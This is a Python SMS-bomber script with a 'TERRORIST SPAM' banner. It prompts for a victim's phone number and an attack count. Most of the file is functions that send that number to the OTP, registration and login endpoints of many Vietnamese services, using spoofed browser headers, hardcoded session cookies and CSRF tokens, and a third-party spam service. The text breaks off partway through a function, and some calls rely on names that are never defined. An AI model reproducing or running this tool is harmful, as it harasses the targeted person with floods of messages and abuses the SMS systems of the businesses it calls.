import signal
import sys
import os
import time
import re
import requests,os,time,re,json,uuid,random,sys
from concurrent.futures import ThreadPoolExecutor
ban = """\033[1;31m

\x1b[38;5;160m▄▄▄█████▓▓█████  ██▀███   ██▀███   ▒█████   ██▀███   ██▓  ██████ ▄▄▄█████▓     ██████  ██▓███   ▄▄▄       ███▄ ▄███▓
\x1b[38;5;160m▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒▓██ ▒ ██▒▒██▒  ██▒▓██ ▒ ██▒▓██▒▒██    ▒ ▓  ██▒ ▓▒   ▒██    ▒ ▓██░  ██▒▒████▄    ▓██▒▀█▀ ██▒
\x1b[38;5;160m▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒▓██ ░▄█ ▒▒██░  ██▒▓██ ░▄█ ▒▒██▒░ ▓██▄   ▒ ▓██░ ▒░   ░ ▓██▄   ▓██░ ██▓▒▒██  ▀█▄  ▓██    ▓██░
\x1b[38;5;160m░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄  ▒██▀▀█▄  ▒██   ██░▒██▀▀█▄  ░██░  ▒   ██▒░ ▓██▓ ░      ▒   ██▒▒██▄█▓▒ ▒░██▄▄▄▄██ ▒██    ▒██ 
\x1b[38;5;160m  ▒██▒ ░ ░▒████▒░██▓ ▒██▒░██▓ ▒██▒░ ████▓▒░░██▓ ▒██▒░██░▒██████▒▒  ▒██▒ ░    ▒██████▒▒▒██▒ ░  ░ ▓█   ▓██▒▒██▒   ░██▒
\x1b[38;5;160m  ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░▓  ▒ ▒▓▒ ▒ ░  ▒ ░░      ▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒░   ░  ░
\x1b[38;5;160m    ░     ░ ░  ░  ░▒ ░ ▒░  ░▒ ░ ▒░  ░ ▒ ▒░   ░▒ ░ ▒░ ▒ ░░ ░▒  ░ ░    ░       ░ ░▒  ░ ░░▒ ░       ▒   ▒▒ ░░  ░      ░
\x1b[38;5;160m  ░         ░     ░░   ░   ░░   ░ ░ ░ ░ ▒    ░░   ░  ▒ ░░  ░  ░    ░         ░  ░  ░  ░░         ░   ▒   ░      ░   
\x1b[38;5;160m            ░  ░   ░        ░         ░ ░     ░      ░        ░                    ░                 ░  ░       ░   
\x1b[38;5;160m|━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;255m< TERRORIST SPAM >\x1b[38;5;160m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━|
"""
def signal_handler(sig, frame):
    print("\n\x1b[38;5;160m[  \x1b[38;5;255m! \x1b[38;5;160m ] Ctrl+C detected. Exiting gracefully.")
    sys.exit(1)
signal.signal(signal.SIGINT, signal_handler)

def banner():
    os.system("cls")
    for h in ban:
        sys.stdout.write(h)
        sys.stdout.flush()
        time.sleep(0.0003)

banner()
amount = 5000

try:
    sdt = input("\x1b[38;5;160m[  \x1b[38;5;255m# \x1b[38;5;160m ] Victim NumBer  : \x1b[38;5;255m")

    # Updated regex pattern to match exactly 10 digits | D4XG
    while not re.match(r"^(0\d{9})$", sdt):
        print("\x1b[38;5;160m[  \x1b[38;5;255m? \x1b[38;5;160m ] Phone number have to include \x1b[38;5;255m10\x1b[38;5;160m numbers")
        sdt = input("\x1b[38;5;160m[  \x1b[38;5;255m# \x1b[38;5;160m ] Victim NumBer  : \x1b[38;5;255m")
        if sdt in ["0123456789", "113", "114"]:
            print("\x1b[38;5;160m[  \x1b[38;5;255m! \x1b[38;5;160m ] Cannot perform attack on those phone numbers")
            exit()

    count = int(input("\x1b[38;5;160m[  \x1b[38;5;255m% \x1b[38;5;160m ] Attack Request : \x1b[38;5;255m"))

except KeyboardInterrupt:
    print("\n\x1b[38;5;160m[  \x1b[38;5;255m! \x1b[38;5;160m ] Ctrl+C detected. Returning to menu.")
    # Handle any necessary cleanup or actions before returning to the menu
    sys.exit(1)


threading = ThreadPoolExecutor(max_workers=int(100000))
def vayvnd(sdt):
  data = '{"phone":"sdt","utm":[{"utm_source":"google","utm_medium":"organic","referrer":"https://www.google.com/"}],"sourceSite":3}'.replace("sdt",sdt)
  head = {
    "Host":"api.vayvnd.vn",
    "accept":"application/json",
    "accept-language":"vi-VN",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "site-id":"3",
    "content-type":"application/json; charset=utf-8",
    "origin":"https://vayvnd.vn",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://vayvnd.vn/",
    "accept-encoding":"gzip, deflate, br",
  }
  rq = requests.post("https://api.vayvnd.vn/v2/users",data=data,headers=head).json()
def tamo(sdt):
  data = '{"mobilePhone":{"number":"sdt"}}'.replace("sdt",sdt)
  head = {
    "Host":"api.tamo.vn",
    "accept":"application/json, text/plain, */*",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json;charset=UTF-8",
    "origin":"https://www.tamo.vn",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://www.tamo.vn/",
    "accept-encoding":"gzip, deflate, br",
    "accept-language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
  }
  rq = requests.post("https://api.tamo.vn/web/public/client/phone/sms-code-ts",data=data,headers=head).json()

def meta(sdt):
  data = '{"api_args":{"lgUser":"sdt","act":"send","type":"phone"},"api_method":"CheckExist"}'.replace("sdt",sdt)
  head = {
    "Host":"meta.vn",
    "accept":"application/json, text/plain, */*",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json",
    "origin":"https://meta.vn",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-origin",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://meta.vn/account/register",
    "accept-encoding":"gzip, deflate, br",
    "accept-language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
  }
  rq = requests.post("https://meta.vn/app_scripts/pages/AccountReact.aspx?api_mode=1",data=data,headers=head).text
def kiot(phone):
    cookies = {
        'AKA_A2': 'A',
        'gkvas-uuid': 'b1b6bfdd-724e-449f-8acc-f3594f1aae3f',
        'gkvas-uuid-d': '1687347271111',
        'kvas-uuid': '1fdbe87b-fe8b-4cd5-b065-0900b3db04b6',
        'kvas-uuid-d': '1687347276471',
        'kv-session': '52268693-9db7-4b7d-ab00-0f5022612bc5',
        'kv-session-d': '1687347276474',
        '_fbp': 'fb.1.1687347277057.810313564',
        '_hjFirstSeen': '1',
        '_hjIncludedInSessionSample_563959': '1',
        '_hjSession_563959': 'eyJpZCI6IjI0OTRjOTA0LTEwYzQtNGVkMS04MGViLWFhZWRjZTg5Y2FmMSIsImNyZWF0ZWQiOjE2ODczNDcyNzcxNTYsImluU2FtcGxlIjp0cnVlfQ==',
        '_hjAbsoluteSessionInProgress': '1',
        '_tt_enable_cookie': '1',
        '_ttp': 'idt42AWvO5FQ_0j25HtJ7BSoA7J',
        '_gid': 'GA1.2.1225607496.1687347277',
        '_hjSessionUser_563959': 'eyJpZCI6ImRiOGYyMzEzLTdkMzItNTNmNi1hNWUzLTA4MjU5ZTE1MTRiOCIsImNyZWF0ZWQiOjE2ODczNDcyNzcxMzIsImV4aXN0aW5nIjp0cnVlfQ==',
        '_ga_6HE3N545ZW': 'GS1.1.1687347278.1.1.1687347282.56.0.0',
        '_ga_N9QLKLC70S': 'GS1.2.1687347283.1.1.1687347283.0.0.0',
        '_fw_crm_v': '4c8714f2-5161-4721-c213-fe417c49ae65',
        'parent': '65',
        '_ga': 'GA1.2.1568204857.1687347277',
    }

    headers = {
        'authority': 'www.kiotviet.vn',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'AKA_A2=A; gkvas-uuid=b1b6bfdd-724e-449f-8acc-f3594f1aae3f; gkvas-uuid-d=1687347271111; kvas-uuid=1fdbe87b-fe8b-4cd5-b065-0900b3db04b6; kvas-uuid-d=1687347276471; kv-session=52268693-9db7-4b7d-ab00-0f5022612bc5; kv-session-d=1687347276474; _fbp=fb.1.1687347277057.810313564; _hjFirstSeen=1; _hjIncludedInSessionSample_563959=1; _hjSession_563959=eyJpZCI6IjI0OTRjOTA0LTEwYzQtNGVkMS04MGViLWFhZWRjZTg5Y2FmMSIsImNyZWF0ZWQiOjE2ODczNDcyNzcxNTYsImluU2FtcGxlIjp0cnVlfQ==; _hjAbsoluteSessionInProgress=1; _tt_enable_cookie=1; _ttp=idt42AWvO5FQ_0j25HtJ7BSoA7J; _gid=GA1.2.1225607496.1687347277; _hjSessionUser_563959=eyJpZCI6ImRiOGYyMzEzLTdkMzItNTNmNi1hNWUzLTA4MjU5ZTE1MTRiOCIsImNyZWF0ZWQiOjE2ODczNDcyNzcxMzIsImV4aXN0aW5nIjp0cnVlfQ==; _ga_6HE3N545ZW=GS1.1.1687347278.1.1.1687347282.56.0.0; _ga_N9QLKLC70S=GS1.2.1687347283.1.1.1687347283.0.0.0; _fw_crm_v=4c8714f2-5161-4721-c213-fe417c49ae65; parent=65; _ga=GA1.2.1568204857.1687347277',
        'origin': 'https://www.kiotviet.vn',
        'referer': 'https://www.kiotviet.vn/dang-ky/',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': '+84'+phone[1:],
        'code': 'bancainayne',
        'name': 'Cai Nit',
        'email': 'ahihi123982@gmail.com',
        'zone': 'An Giang - Huyện Châu Phú',
        'merchant': 'bancainayne',
        'username': '0972936627',
        'industry': 'Điện thoại & Điện máy',
        'ref_code': '',
        'industry_id': '65',
        'phone_input': "0338607465",
    }

    response = requests.post(
        'https://www.kiotviet.vn/wp-content/themes/kiotviet/TechAPI/getOTP.php',
        cookies=cookies,
        headers=headers,
        data=data,
    ).text
def fpt(phone):
	requests.post("https://fptshop.com.vn/api-data/loyalty/Home/Verification", headers={"Host": "fptshop.com.vn","content-length": "16","accept": "*/*","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","x-requested-with": "XMLHttpRequest","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://fptshop.com.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://fptshop.com.vn/","accept-encoding": "gzip, deflate, br"}, data={"phone":phone}).text
def alfrescos(sdt):
  data = '{"phoneNumber":"sdt","secureHash":"33f65da1c264ef7f519149065a600def","deviceId":"","sendTime":1691068424578,"type":2}'.replace("sdt",sdt)
  head = {
    "Host":"api.alfrescos.com.vn",
    "accept":"application/json, text/plain, */*",
    "brandcode":"ALFRESCOS",
    "devicecode":"web",
    "accept-language":"vi-VN",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json",
    "origin":"https://alfrescos.com.vn",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://alfrescos.com.vn/",
    "accept-encoding":"gzip, deflate, br",
  }
  rq = requests.post("https://api.alfrescos.com.vn/api/v1/User/SendSms?culture=vi-VN",data=data,headers=head).json()
def poyeye(sdt):
  data= '{"phone":"sdt","firstName":"Nguyen","lastName":"Hoang","email":"Khgf123@gmail.com","password":"1262007gdtg"}'
  data = data.replace("sdt",sdt)
  head = {
    "Host":"api.popeyes.vn",
    "accept":"application/json",
    "x-client":"WebApp",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://popeyes.vn/",
    "accept-encoding":"gzip, deflate, br",
  }
  rq = requests.post("https://api.popeyes.vn/api/v1/register",data=data, headers=head).json()

def vieon(sdt):
  data = f'phone_number={sdt}&password=1262007Gdtg&given_name=&device_id=688e6ab3da160a362df3805047548504&platform=mobile_web&model=Android%208.1.0&push_token=&device_name=Chrome%2F114&device_type=desktop&isMorePlatform=true&ui=012021'
  head = {
    "Host":"api.vieon.vn",
    "accept":"application/json, text/plain, */*",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/x-www-form-urlencoded",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://vieon.vn/",
    "accept-encoding":"gzip, deflate, br",
  }
  rq = requests.post("https://api.vieon.vn/backend/user/register/mobile?platform=mobile_web&ui=012021",data=data,headers=head).json()
def tv360(sdt):
  head = {
    "Host":"m.tv360.vn",
    "accept":"application/json, text/plain, */*",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json",
  }
  data = '{"msisdn":"sdt"}'
  data = data.replace("sdt",sdt)
  rq = requests.post("https://m.tv360.vn/public/v1/auth/get-otp-login",data=data,headers=head).json()
  '''if not rq["errorCode"] == 200:
    print("Lỗi 360tv")'''

def winmart(sdt):
  head = {
    "Host":"api-crownx.winmart.vn",
    "accept":"application/json",
    "authorization":"Bearer undefined",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://winmart.vn/",
    "accept-encoding":"gzip, deflate, br",
    "accept-language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
  }
  rq = requests.get(f"https://api-crownx.winmart.vn/as/api/web/v1/send-otp?phoneNo={sdt}",headers=head).json()
def fptplay(phone):
    Headers = {"Host": "api.fptplay.net","content-length": "89","sec-ch-ua": "\"Chromium\";v\u003d\"112\", \"Google Chrome\";v\u003d\"112\", \"Not:A-Brand\";v\u003d\"99\"","accept": "application/json, text/plain, */*","content-type": "application/json; charset\u003dUTF-8","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","origin": "https://fptplay.vn","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://fptplay.vn/","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Datason = json.dumps({"phone": phone,"country_code":"VN","client_id":"vKyPNd1iWHodQVknxcvZoWz74295wnk8"})
    response = requests.post("https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st\u003dEim9hpobCZPoIoVVokkIDA\u0026e\u003d1681802671\u0026device\u003dChrome(version%253A112.0.0.0)\u0026drm\u003d1", data=Datason, headers=Headers).json()
def funring(sdt):
  data ='{"username": "sdt"}'.replace("sdt",sdt)
  head = {
    "Host":"funring.vn",
    "Connection":"keep-alive",
    "Accept":"*/*",
    "User-Agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "Content-Type":"application/json",
    "X-Requested-With":"mark.via.gp",
    "Accept-Encoding":"gzip, deflate",
    "Accept-Language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"
  }
  rq = requests.post("http://funring.vn/api/v1.0.1/jersey/user/getotp",data=data,headers=head).json()
def apispam(phone):
  cookies = {
    '_ga': 'GA1.1.1928856259.1691039310',
    'serverChoice': 'Server-IPv1',
    '_ga_Y4RF4MF664': 'GS1.1.1691039309.1.1.1691039359.0.0.0',
  }
  headers = {
    'authority': 'crowstore.online',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': '_ga=GA1.1.1928856259.1691039310; serverChoice=Server-IPv1; _ga_Y4RF4MF664=GS1.1.1691039309.1.1.1691039359.0.0.0',
    'origin': 'https://crowstore.online',
    'referer': 'https://crowstore.online/sms.php',
    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
}
  data = {
    'sodienthoai': phone,
    'ten_server': 'Server-IPv1',
    'key': 'freekey307',
}

  response = requests.post('https://crowstore.online/sms.php', cookies=cookies, headers=headers, data=data).text
def vietid(phone):
    csrfget = requests.post("https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F").text
    csrf = csrfget.split('name="csrf-token" value="')[1].split('"/>')[0]
    Headers = {"Host": "oauth.vietid.net","content-length": "41","cache-control": "max-age\u003d0","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","sec-ch-ua-mobile": "?1","sec-ch-ua-platform": "\"Android\"","upgrade-insecure-requests": "1","origin": "https://oauth.vietid.net","content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/avif,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.7","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4","cookie": "_ga_H5VRTZBFLG\u003dGS1.1.1679234987.1.0.1679234987.0.0.0"}
    Payload = {"csrf-token": csrf,"account": phone}
    response = requests.post("https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F", data=Payload, headers=Headers).text
def dkvt(phone):
    cookies = {
        'laravel_session': '7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2',
        '__zi': '2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1',
        'redirectLogin': 'https://viettel.vn/dang-ky',
        'XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2; __zi=2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1; redirectLogin=https://viettel.vn/dang-ky; XSRF-TOKEN=eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/dang-ky',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'msisdn': phone,
    }

    response = requests.post('https://viettel.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data).text
def viettel(phone):
    cookies = {
        'laravel_session': 'XDw3rSn7ipZocrQTQOYxheTOvGVO2BPLJJC9Iqpv',
        '_gcl_au': '1.1.307401310.1685096321',
        '_gid': 'GA1.2.1786782073.1685096321',
        '_fbp': 'fb.1.1685096322884.1341401421',
        '__zi': '2000.SSZzejyD3jSkdl-krWqVtYU9zQ-T61wH9TthuPC0NCqtr_NpqH9AtJY9_VMSN4xGC8Bx_P0PJzSyol__dXnArJCoDG.1',
        'redirectLogin': 'https://vietteltelecom.vn/dang-ky',
        '_ga_VH8261689Q': 'GS1.1.1685096321.1.1.1685096380.1.0.0',
        '_ga': 'GA1.2.1385846845.1685096321',
        '_gat_UA-58224545-1': '1',
        'XSRF-TOKEN': 'eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=XDw3rSn7ipZocrQTQOYxheTOvGVO2BPLJJC9Iqpv; _gcl_au=1.1.307401310.1685096321; _gid=GA1.2.1786782073.1685096321; _fbp=fb.1.1685096322884.1341401421; __zi=2000.SSZzejyD3jSkdl-krWqVtYU9zQ-T61wH9TthuPC0NCqtr_NpqH9AtJY9_VMSN4xGC8Bx_P0PJzSyol__dXnArJCoDG.1; redirectLogin=https://vietteltelecom.vn/dang-ky; _ga_VH8261689Q=GS1.1.1685096321.1.1.1685096380.1.0.0; _ga=GA1.2.1385846845.1685096321; _gat_UA-58224545-1=1; XSRF-TOKEN=eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ%3D%3D',
        'Origin': 'https://vietteltelecom.vn',
        'Referer': 'https://vietteltelecom.vn/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'dS0MwhelCkb96HCH9kVlEd3CxX8yyiQim71Acpr6',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ==',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone': phone,
        'type': '',
    }

    response = requests.post('https://vietteltelecom.vn/api/get-otp-login', cookies=cookies, headers=headers, json=json_data).text
    
def zlpay(phone):
    token = requests.get('https://api.zalopay.vn/v2/account/phone/status', params=params, headers=headers).json()['data']['send_otp_token']
    json_data = {'phone_number': "0"+phone[1:11],'send_otp_token': token}
    response = requests.post('https://api.zalopay.vn/v2/account/otp', headers=headers, json=json_data).text
###

def momo(phone):
    microtime = int(round(time.time() * 1000))
    imei = getimei()
    secureid = get_SECUREID()
    token= get_TOKEN()
    rkey = generateRandomString(22, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')
    aaid = getimei()
    data = {
        "user":"0"+phone[1:11],
